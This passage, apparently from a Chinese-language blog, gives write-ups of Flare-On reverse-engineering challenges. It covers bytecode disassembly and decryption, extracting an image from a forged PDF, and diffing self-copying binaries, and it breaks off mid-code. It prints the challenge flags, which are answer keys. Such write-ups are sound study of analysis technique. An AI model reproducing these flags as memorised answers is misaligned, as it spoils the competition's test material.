class="number">3</span> (NULL + os)</span><br><span class="line">             <span class="number">68</span> LOAD_ATTR                <span class="number">4</span> (getlogin)</span><br><span class="line">             <span class="number">88</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">             <span class="number">96</span> LOAD_ATTR                <span class="number">7</span> (NULL|self + encode)</span><br><span class="line">            <span class="number">116</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">            <span class="number">124</span> STORE_FAST               <span class="number">2</span> (current_user)</span><br><span class="line"></span><br><span class="line"> <span class="number">25</span>         <span class="number">126</span> LOAD_GLOBAL              <span class="number">9</span> (NULL + bytes)</span><br><span class="line">            <span class="number">136</span> LOAD_CONST               <span class="number">5</span> (&lt;code object &lt;genexpr&gt; <span class="meta">at</span> <span class="number">0x000001DBD8872730</span>, file <span class="string">&quot;&lt;catalyst_core&gt;&quot;</span>, line <span class="number">25</span>&gt;)</span><br><span class="line">            <span class="number">138</span> MAKE_FUNCTION            <span class="number">0</span></span><br><span class="line">            <span class="number">140</span> LOAD_GLOBAL             <span class="number">11</span> (NULL + enumerate)</span><br><span class="line">            <span class="number">150</span> LOAD_FAST                <span class="number">2</span> (current_user)</span><br><span class="line">            <span class="number">152</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">160</span> GET_ITER</span><br><span class="line">            <span class="number">162</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">            <span class="number">170</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">178</span> STORE_FAST               <span class="number">3</span> (user_signature)</span><br><span class="line"></span><br><span class="line"> <span class="number">27</span>         <span class="number">180</span> LOAD_GLOBAL             <span class="number">13</span> (NULL + asyncio)</span><br><span class="line">            <span class="number">190</span> LOAD_ATTR               <span class="number">14</span> (sleep)</span><br><span class="line">            <span class="number">210</span> LOAD_CONST               <span class="number">6</span> (<span class="number">0.01</span>)</span><br><span class="line">            <span class="number">212</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">220</span> GET_AWAITABLE            <span class="number">0</span></span><br><span class="line">            <span class="number">222</span> LOAD_CONST               <span class="number">0</span> (None)</span><br><span class="line">        &gt;&gt;  <span class="number">224</span> SEND                     <span class="number">3</span> (to <span class="number">234</span>)</span><br><span class="line">            <span class="number">228</span> YIELD_VALUE              <span class="number">2</span></span><br><span class="line">            <span class="number">230</span> RESUME                   <span class="number">3</span></span><br><span class="line">            <span class="number">232</span> JUMP_BACKWARD_NO_INTERRUPT     <span class="number">5</span> (to <span class="number">224</span>)</span><br><span class="line">        &gt;&gt;  <span class="number">234</span> END_SEND</span><br><span class="line">            <span class="number">236</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">29</span>         <span class="number">238</span> LOAD_CONST               <span class="number">7</span> (<span class="string">&#x27;pending&#x27;</span>)</span><br><span class="line">            <span class="number">240</span> STORE_FAST               <span class="number">4</span> (status)</span><br><span class="line"></span><br><span class="line"> <span class="number">30</span>         <span class="number">242</span> LOAD_FAST                <span class="number">4</span> (status)</span><br><span class="line"></span><br><span class="line"> <span class="number">31</span>         <span class="number">244</span> LOAD_CONST               <span class="number">7</span> (<span class="string">&#x27;pending&#x27;</span>)</span><br><span class="line">            <span class="number">246</span> COMPARE_OP              <span class="number">40</span> (==)</span><br><span class="line">            <span class="number">250</span> EXTENDED_ARG             <span class="number">1</span></span><br><span class="line">            <span class="number">252</span> POP_JUMP_IF_FALSE      <span class="number">294</span> (to <span class="number">842</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">32</span>         <span class="number">254</span> LOAD_FAST                <span class="number">3</span> (user_signature)</span><br><span class="line">            <span class="number">256</span> LOAD_FAST                <span class="number">0</span> (LEAD_RESEARCHER_SIGNATURE)</span><br><span class="line">            <span class="number">258</span> COMPARE_OP              <span class="number">40</span> (==)</span><br><span class="line">            <span class="number">262</span> POP_JUMP_IF_FALSE      <span class="number">112</span> (to <span class="number">488</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">33</span>         <span class="number">264</span> LOAD_GLOBAL             <span class="number">17</span> (NULL + art)</span><br><span class="line">            <span class="number">274</span> LOAD_ATTR               <span class="number">18</span> (tprint)</span><br><span class="line">            <span class="number">294</span> LOAD_CONST               <span class="number">8</span> (<span class="string">&#x27;AUTHENTICATION   SUCCESS&#x27;</span>)</span><br><span class="line">            <span class="number">296</span> LOAD_CONST               <span class="number">9</span> (<span class="string">&#x27;small&#x27;</span>)</span><br><span class="line">            <span class="number">298</span> KW_NAMES                <span class="number">10</span> ((<span class="string">&#x27;font&#x27;</span>,))</span><br><span class="line">            <span class="number">300</span> <span class="keyword">CALL</span>                     <span class="number">2</span></span><br><span class="line">            <span class="number">308</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">34</span>         <span class="number">310</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">            <span class="number">320</span> LOAD_CONST              <span class="number">11</span> (<span class="string">&#x27;Biometric scan MATCH. Identity confirmed as Lead Researcher.&#x27;</span>)</span><br><span class="line">            <span class="number">322</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">330</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">35</span>         <span class="number">332</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">            <span class="number">342</span> LOAD_CONST              <span class="number">12</span> (<span class="string">&#x27;Finalizing Project Chimera...&#x27;</span>)</span><br><span class="line">            <span class="number">344</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">352</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">37</span>         <span class="number">354</span> LOAD_GLOBAL             <span class="number">21</span> (NULL + ARC4)</span><br><span class="line">            <span class="number">364</span> LOAD_FAST                <span class="number">2</span> (current_user)</span><br><span class="line">            <span class="number">366</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">374</span> STORE_FAST               <span class="number">5</span> (arc4_decipher)</span><br><span class="line"></span><br><span class="line"> <span class="number">38</span>         <span class="number">376</span> LOAD_FAST                <span class="number">5</span> (arc4_decipher)</span><br><span class="line">            <span class="number">378</span> LOAD_ATTR               <span class="number">23</span> (NULL|self + decrypt)</span><br><span class="line">            <span class="number">398</span> LOAD_FAST                <span class="number">1</span> (ENCRYPTED_CHIMERA_FORMULA)</span><br><span class="line">            <span class="number">400</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">408</span> LOAD_ATTR               <span class="number">25</span> (NULL|self + decode)</span><br><span class="line">            <span class="number">428</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">            <span class="number">436</span> STORE_FAST               <span class="number">6</span> (decrypted_formula)</span><br><span class="line"></span><br><span class="line"> <span class="number">41</span>         <span class="number">438</span> LOAD_GLOBAL             <span class="number">27</span> (NULL + cowsay)</span><br><span class="line">            <span class="number">448</span> LOAD_ATTR               <span class="number">28</span> (cow)</span><br><span class="line">            <span class="number">468</span> LOAD_CONST              <span class="number">13</span> (<span class="string">&#x27;I am alive! The secret formula is:\n&#x27;</span>)</span><br><span class="line">            <span class="number">470</span> LOAD_FAST                <span class="number">6</span> (decrypted_formula)</span><br><span class="line">            <span class="number">472</span> BINARY_OP                <span class="number">0</span> (+)</span><br><span class="line">            <span class="number">476</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">484</span> POP_TOP</span><br><span class="line">            <span class="number">486</span> RETURN_CONST             <span class="number">0</span> (None)</span><br><span class="line"></span><br><span class="line"> <span class="number">43</span>     &gt;&gt;  <span class="number">488</span> LOAD_GLOBAL             <span class="number">17</span> (NULL + art)</span><br><span class="line">            <span class="number">498</span> LOAD_ATTR               <span class="number">18</span> (tprint)</span><br><span class="line">            <span class="number">518</span> LOAD_CONST              <span class="number">14</span> (<span class="string">&#x27;AUTHENTICATION   FAILED&#x27;</span>)</span><br><span class="line">            <span class="number">520</span> LOAD_CONST               <span class="number">9</span> (<span class="string">&#x27;small&#x27;</span>)</span><br><span class="line">            <span class="number">522</span> KW_NAMES                <span class="number">10</span> ((<span class="string">&#x27;font&#x27;</span>,))</span><br><span class="line">            <span class="number">524</span> <span class="keyword">CALL</span>                     <span class="number">2</span></span><br><span class="line">            <span class="number">532</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">44</span>         <span class="number">534</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">            <span class="number">544</span> LOAD_CONST              <span class="number">15</span> (<span class="string">&#x27;Impostor detected, my genius cannot be replicated!&#x27;</span>)</span><br><span class="line">            <span class="number">546</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">554</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">45</span>         <span class="number">556</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">            <span class="number">566</span> LOAD_CONST              <span class="number">16</span> (<span class="string">&#x27;The resulting specimen has developed an unexpected, and frankly useless, sense of humor.&#x27;</span>)</span><br><span class="line">            <span class="number">568</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">576</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">47</span>         <span class="number">578</span> LOAD_GLOBAL             <span class="number">31</span> (NULL + pyjokes)</span><br><span class="line">            <span class="number">588</span> LOAD_ATTR               <span class="number">32</span> (get_joke)</span><br><span class="line">            <span class="number">608</span> LOAD_CONST              <span class="number">17</span> (<span class="string">&#x27;en&#x27;</span>)</span><br><span class="line">            <span class="number">610</span> LOAD_CONST              <span class="number">18</span> (<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line">            <span class="number">612</span> KW_NAMES                <span class="number">19</span> ((<span class="string">&#x27;language&#x27;</span>, <span class="string">&#x27;category&#x27;</span>))</span><br><span class="line">            <span class="number">614</span> <span class="keyword">CALL</span>                     <span class="number">2</span></span><br><span class="line">            <span class="number">622</span> STORE_FAST               <span class="number">7</span> (joke)</span><br><span class="line"></span><br><span class="line"> <span class="number">48</span>         <span class="number">624</span> LOAD_GLOBAL             <span class="number">26</span> (cowsay)</span><br><span class="line">            <span class="number">634</span> LOAD_ATTR               <span class="number">34</span> (char_names)</span><br><span class="line">            <span class="number">654</span> LOAD_CONST              <span class="number">20</span> (<span class="number">1</span>)</span><br><span class="line">            <span class="number">656</span> LOAD_CONST               <span class="number">0</span> (None)</span><br><span class="line">            <span class="number">658</span> BINARY_SLICE</span><br><span class="line">            <span class="number">660</span> STORE_FAST               <span class="number">8</span> (animals)</span><br><span class="line"></span><br><span class="line"> <span class="number">49</span>         <span class="number">662</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">            <span class="number">672</span> LOAD_GLOBAL             <span class="number">27</span> (NULL + cowsay)</span><br><span class="line">            <span class="number">682</span> LOAD_ATTR               <span class="number">36</span> (get_output_string)</span><br><span class="line">            <span class="number">702</span> LOAD_GLOBAL             <span class="number">39</span> (NULL + random)</span><br><span class="line">            <span class="number">712</span> LOAD_ATTR               <span class="number">40</span> (choice)</span><br><span class="line">            <span class="number">732</span> LOAD_FAST                <span class="number">8</span> (animals)</span><br><span class="line">            <span class="number">734</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">742</span> LOAD_GLOBAL             <span class="number">31</span> (NULL + pyjokes)</span><br><span class="line">            <span class="number">752</span> LOAD_ATTR               <span class="number">32</span> (get_joke)</span><br><span class="line">            <span class="number">772</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">            <span class="number">780</span> <span class="keyword">CALL</span>                     <span class="number">2</span></span><br><span class="line">            <span class="number">788</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">796</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">50</span>         <span class="number">798</span> LOAD_GLOBAL             <span class="number">43</span> (NULL + sys)</span><br><span class="line">            <span class="number">808</span> LOAD_ATTR               <span class="number">44</span> (exit)</span><br><span class="line">            <span class="number">828</span> LOAD_CONST              <span class="number">20</span> (<span class="number">1</span>)</span><br><span class="line">            <span class="number">830</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">838</span> POP_TOP</span><br><span class="line">            <span class="number">840</span> RETURN_CONST             <span class="number">0</span> (None)</span><br><span class="line"></span><br><span class="line"> <span class="number">51</span>     &gt;&gt;  <span class="number">842</span> <span class="keyword">NOP</span></span><br><span class="line"></span><br><span class="line"> <span class="number">52</span>         <span class="number">844</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">            <span class="number">854</span> LOAD_CONST              <span class="number">21</span> (<span class="string">&#x27;System error: Unknown experimental state.&#x27;</span>)</span><br><span class="line">            <span class="number">856</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">864</span> POP_TOP</span><br><span class="line">            <span class="number">866</span> RETURN_CONST             <span class="number">0</span> (None)</span><br><span class="line"></span><br><span class="line"> <span class="number">27</span>     &gt;&gt;  <span class="number">868</span> CLEANUP_THROW</span><br><span class="line">            <span class="number">870</span> EXTENDED_ARG             <span class="number">1</span></span><br><span class="line">            <span class="number">872</span> JUMP_BACKWARD          <span class="number">320</span> (to <span class="number">234</span>)</span><br><span class="line">        &gt;&gt;  <span class="number">874</span> CALL_INTRINSIC_1         <span class="number">3</span> (INTRINSIC_STOPITERATION_ERROR)</span><br><span class="line">            <span class="number">876</span> RERAISE                  <span class="number">1</span></span><br><span class="line"><span class="symbol">ExceptionTable:</span></span><br><span class="line">  <span class="number">4</span> to <span class="number">226</span> -&gt; <span class="number">874</span> [<span class="number">0</span>] lasti</span><br><span class="line">  <span class="number">228</span> to <span class="number">228</span> -&gt; <span class="number">868</span> [<span class="number">2</span>]</span><br><span class="line">  <span class="number">230</span> to <span class="number">868</span> -&gt; <span class="number">874</span> [<span class="number">0</span>] lasti</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;genexpr&gt; <span class="meta">at</span> <span class="number">0x000001DBD8872730</span>, file <span class="string">&quot;&lt;catalyst_core&gt;&quot;</span>, line <span class="number">25</span>&gt;:</span><br><span class="line"> <span class="number">25</span>           <span class="number">0</span> RETURN_GENERATOR</span><br><span class="line">              <span class="number">2</span> POP_TOP</span><br><span class="line">              <span class="number">4</span> RESUME                   <span class="number">0</span></span><br><span class="line">              <span class="number">6</span> LOAD_FAST                <span class="number">0</span> (.<span class="number">0</span>)</span><br><span class="line">        &gt;&gt;    <span class="number">8</span> FOR_ITER                <span class="number">15</span> (to <span class="number">42</span>)</span><br><span class="line">             <span class="number">12</span> UNPACK_SEQUENCE          <span class="number">2</span></span><br><span class="line">             <span class="number">16</span> STORE_FAST               <span class="number">1</span> (i)</span><br><span class="line">             <span class="number">18</span> STORE_FAST               <span class="number">2</span> (c)</span><br><span class="line">             <span class="number">20</span> LOAD_FAST                <span class="number">2</span> (c)</span><br><span class="line">             <span class="number">22</span> LOAD_FAST                <span class="number">1</span> (i)</span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">0</span> (<span class="number">42</span>)</span><br><span class="line">             <span class="number">26</span> BINARY_OP                <span class="number">0</span> (+)</span><br><span class="line">             <span class="number">30</span> BINARY_OP               <span class="number">12</span> (^)</span><br><span class="line">             <span class="number">34</span> YIELD_VALUE              <span class="number">1</span></span><br><span class="line">             <span class="number">36</span> RESUME                   <span class="number">1</span></span><br><span class="line">             <span class="number">38</span> POP_TOP</span><br><span class="line">             <span class="number">40</span> JUMP_BACKWARD           <span class="number">17</span> (to <span class="number">8</span>)</span><br><span class="line">        &gt;&gt;   <span class="number">42</span> END_FOR</span><br><span class="line">             <span class="number">44</span> RETURN_CONST             <span class="number">1</span> (None)</span><br><span class="line">        &gt;&gt;   <span class="number">46</span> CALL_INTRINSIC_1         <span class="number">3</span> (INTRINSIC_STOPITERATION_ERROR)</span><br><span class="line">             <span class="number">48</span> RERAISE                  <span class="number">1</span></span><br><span class="line"><span class="symbol">ExceptionTable:</span></span><br><span class="line">  <span class="number">4</span> to <span class="number">44</span> -&gt; <span class="number">46</span> [<span class="number">0</span>] lasti</span><br></pre></td></tr></table></figure>

<p>得到密钥<font color=lime><strong>b’m\x1b@I\x1dAoe@\x07ZF[BL\rN\n\x0cS’</strong></font>和密文<font color=red><strong>b’r2b-\r\x9e\xf2\x1fp\x185\x82\xcf\xfc\x90\x14\xf1O\xad#]\xf3\xe2\xc0L\xd0\xc1e\x0c\xea\xec\xae\x11b\xa7\x8c\xaa!\xa1\x9d\xc2\x90’</strong></font>，其中密钥有一个xor 42+idx的自解密，解密得到<font color=violet><strong>G0ld3n_Tr4nsmut4t10n</strong></font>，再解密即可</p>
<p><font color=deepskyblue><strong><a href="mailto:&#84;&#x68;&#x33;&#95;&#65;&#x6c;&#x63;&#104;&#x33;&#109;&#49;&#x73;&#116;&#115;&#x5f;&#83;&#x33;&#x63;&#114;&#x33;&#116;&#95;&#70;&#48;&#x72;&#109;&#x75;&#x6c;&#52;&#x40;&#x66;&#108;&#97;&#x72;&#101;&#45;&#x6f;&#x6e;&#x2e;&#99;&#x6f;&#109;">Th3_Alch3m1sts_S3cr3t_F0rmul4@flare-on.com</a></strong></font></p>
<h1 id="3-pretty-devilish-file"><a href="#3-pretty-devilish-file" class="headerlink" title="#3 pretty_devilish_file"></a>#3 pretty_devilish_file</h1><p>文件是一个伪造的pdf，其中有一个320字节的buffer似乎是zlib压缩格式，但是被AES加密了，先解密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qpdf --decrypt --stream-data=uncompress pretty_devilish_file.pdf decrypted.pdf</span><br></pre></td></tr></table></figure>

<p>然后查看解压出来的内容，发现了一串hex：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffd8ffe000104a46494600010100000100010000ffdb00430001010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101ffc0000b080001002501011100ffc40017000100030000000000000000000000000006040708ffc400241000000209050100000000000000000000000702050608353776b6b7030436747577ffda0008010100003f00c54d3401dcbbfb9c38db8a7dd265a2159e9d945a086407383aabd52e5034c274e57179ef3bcdfca50f0af80aff00e986c64568c7ffd9</span><br></pre></td></tr></table></figure>

<p>fromhex后是一个jpg图片，只有一排像素，有明暗相间条纹，读取灰度：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image_path = <span class="string">&quot;data.jpg&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line">pixels = <span class="built_in">bytearray</span>(img.getdata())[:width]</span><br><span class="line"><span class="built_in">print</span>(pixels)</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong><a href="mailto:&#x50;&#x75;&#122;&#122;&#x6c;&#49;&#x6e;&#103;&#x2d;&#68;&#51;&#118;&#105;&#108;&#105;&#115;&#x68;&#x2d;&#70;&#x30;&#114;&#109;&#97;&#116;&#64;&#x66;&#x6c;&#x61;&#x72;&#101;&#x2d;&#x6f;&#110;&#46;&#x63;&#x6f;&#109;">Puzzl1ng-D3vilish-F0rmat@flare-on.com</a></strong></font></p>
<h1 id="4-UnholyDragon"><a href="#4-UnholyDragon" class="headerlink" title="#4 UnholyDragon"></a>#4 UnholyDragon</h1><p>MZ头被改，改回去，程序运行后生成了4个副本并退出，编写脚本比较：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_file_differences</span>(<span class="params">original_path, new_paths</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(original_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: original_data = f.read()</span><br><span class="line">    original_size = <span class="built_in">len</span>(original_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;原始文件 &#x27;<span class="subst">&#123;original_path&#125;</span>&#x27; 大小: <span class="subst">&#123;original_size&#125;</span> 字节.&quot;</span>)</span><br><span class="line">    all_differences = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> new_path <span class="keyword">in</span> new_paths:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(new_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: new_data = f.read()</span><br><span class="line">        new_size = <span class="built_in">len</span>(new_data)</span><br><span class="line">        <span class="keyword">if</span> new_size != original_size: min_length = <span class="built_in">min</span>(original_size, new_size)</span><br><span class="line">        <span class="keyword">else</span>: min_length = original_size</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(min_length):</span><br><span class="line">            byte1 = original_data[offset]</span><br><span class="line">            byte2 = new_data[offset]</span><br><span class="line">            <span class="keyword">if</span> byte1 != byte2:</span><br><span class="line">                <span class="keyword">if</span> offset <span class="keyword">not</span> <span class="keyword">in</span> all_differences:</span><br><span class="line">                    all_differences[offset] = &#123; <span class="string">&#x27;original_byte&#x27;</span>: byte1, <span class="string">&#x27;files&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line">                all_differences[offset][<span class="string">&#x27;files&#x27;</span>][new_path] = byte2</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all_differences: <span class="keyword">return</span></span><br><span class="line">    sorted_offsets = <span class="built_in">sorted</span>(all_differences.keys())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n    --- Total <span class="subst">&#123;<span class="built_in">len</span>(sorted_offsets)&#125;</span> offsets have difference ---&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------&quot;</span>)</span><br><span class="line">    header = [<span class="string">&quot;  Offsets &quot;</span>, <span class="string">&quot;Orig&quot;</span>, <span class="string">&quot; 151&quot;</span>, <span class="string">&quot; 152&quot;</span>, <span class="string">&quot; 153&quot;</span>, <span class="string">&quot; 154&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; | &quot;</span>.join(header))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> sorted_offsets:</span><br><span class="line">        diff = all_differences[offset]</span><br><span class="line">        orig_byte = diff[<span class="string">&#x27;original_byte&#x27;</span>]</span><br><span class="line">        offset_hex = <span class="built_in">hex</span>(offset)[<span class="number">2</span>:].upper().zfill(<span class="number">8</span>)</span><br><span class="line">        orig_hex = <span class="built_in">hex</span>(orig_byte)[<span class="number">2</span>:].upper().zfill(<span class="number">2</span>)</span><br><span class="line">        output = [<span class="string">f&quot;0x<span class="subst">&#123;offset_hex&#125;</span>&quot;</span>, <span class="string">f&quot;0x<span class="subst">&#123;orig_hex&#125;</span>&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>): </span><br><span class="line">            file_name = <span class="string">f&#x27;UnholyDragon-<span class="subst">&#123;<span class="number">150</span>+i&#125;</span>.exe&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> file_name <span class="keyword">in</span> diff[<span class="string">&#x27;files&#x27;</span>]:</span><br><span class="line">                new_byte = diff[<span class="string">&#x27;files&#x27;</span>][file_name]</span><br><span class="line">                new_hex = <span class="built_in">hex</span>(new_byte)[<span class="number">2</span>:].upper().zfill(<span class="number">2</span>)</span><br><span class="line">                output.append(<span class="string">f&quot;0x<span class="subst">&#123;new_hex&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output.append(<span class="string">&quot; -- &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; | &quot;</span>.join(output))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    original_file = <span class="string">&#x27;UnholyDragon-150.exe&#x27;</span></span><br><span class="line">    new_files = [<span class="string">f&#x27;UnholyDragon-<span class="subst">&#123;<span class="number">150</span>+i&#125;</span>.exe&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)]</span><br><span class="line">    find_file_differences(original_file, new_files)</span><br></pre></td></tr></table></figure>

<p>发现有4处恰好分别有1、2、3、4个副本不同（虚拟偏移量&#x3D;真实偏移量+0x400C00）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    --- Total 4 offsets have difference ---</span><br><span class="line">-----------------------------------------------</span><br><span class="line">  Offsets  | Orig |  151 |  152 |  153 |  154    虚拟偏移量 段</span><br><span class="line">-----------------------------------------------</span><br><span class="line">0x0006E8F8 | 0xFF |  --  |  --  |  --  | 0x68    0x46F4F8  text</span><br><span class="line">0x001309C1 | 0x5C | 0x94 | 0x94 | 0x94 | 0x94    0x5315C1  data</span><br><span class="line">0x001B19A9 | 0x84 |  --  |  --  | 0x96 | 0x96    0x5B25A9  data</span><br><span class="line">0x00286162 | 0x0D |  --  | 0x43 | 0x43 | 0x43    0x686D62  data</span><br></pre></td></tr></table></figure>

<p>start：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  TlsIndex *= <span class="number">4</span>;</span><br><span class="line">  hHeap = <span class="built_in">GetProcessHeap</span>();</span><br><span class="line">  <span class="built_in">OleInitialize</span>(<span class="number">0</span>);</span><br><span class="line">  picce_.dwICC = <span class="number">0</span>;</span><br><span class="line">  picce_.dwSize = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">InitCommonControlsEx</span>(&amp;picce_);</span><br><span class="line">  dword_4B08BC = (<span class="type">int</span>)&amp;off_68EC60;</span><br><span class="line">  hModule = <span class="built_in">GetModuleHandleA</span>(<span class="number">0</span>);</span><br><span class="line">  v0 = <span class="built_in">sub_402068</span>();</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">sub_402137</span>(v1);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v3) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_470792</span>(v3);</span><br><span class="line">      <span 